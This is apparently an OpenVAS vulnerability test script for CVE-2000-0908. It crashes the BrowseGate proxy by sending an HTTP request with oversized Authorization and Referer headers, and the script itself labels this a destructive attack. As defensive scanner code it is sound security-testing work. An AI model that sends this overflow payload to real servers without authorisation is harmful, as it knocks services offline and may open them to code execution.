# OpenVAS Vulnerability Test
# $Id: browsegate_http_overflows.nasl 9348 2018-04-06 07:01:19Z cfischer $
# Description: BrowseGate HTTP headers overflows
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
# Erik Anderson <eanders@carmichaelsecurity.com>
# Added BugtraqID and CVE
#
# Copyright:
# Copyright (C) 2002 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "It was possible to kill the BrowseGate 
proxy by sending it an invalid request with too long HTTP headers
(Authorization and Referer)

A cracker may exploit this vulnerability to make your web server
crash continually or even execute arbirtray code on your system.";

tag_solution = "upgrade your software or protect it with a filtering reverse proxy";

# This is an old bug. I don't know if we need _two_ overflows to 
# crash BrowseGate or if this crashes any other web server

if(description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.11130");
 script_version("$Revision: 9348 $");
 script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:01:19 +0200 (Fri, 06 Apr 2018) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_bugtraq_id(1702);
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_cve_id("CVE-2000-0908");
 name = "BrowseGate HTTP headers overflows";
 script_name(name);
 

 
 script_category(ACT_DESTRUCTIVE_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
 
 script_copyright("This script is Copyright (C) 2002 Michel Arboi");
 family = "Gain a shell remotely";
 script_family(family);
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");

 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");

port = get_http_port(default:80);

if (http_is_dead(port: port)) exit(0);

soc = http_open_socket(port);
if(! soc) exit(0);

r = string("GET / HTTP/1.0\r\n", 
	"Authorization: Basic", crap(8192), "\r\n", 
	"From: openvas@example.com\r\n",
	"If-Modified-Since: Sat, 29 Oct 1994 19:43:31 GMT\r\n",
	"Referer: http://www.example.com/", crap(8192), "\r\n",
	"UserAgent: OpenVAS 1.2.6\r\n\r\n");

send(socket:soc, data: r);
r = http_recv(socket:soc);
http_close_socket(soc);

if (http_is_dead(port: port)) { security_message(port); }
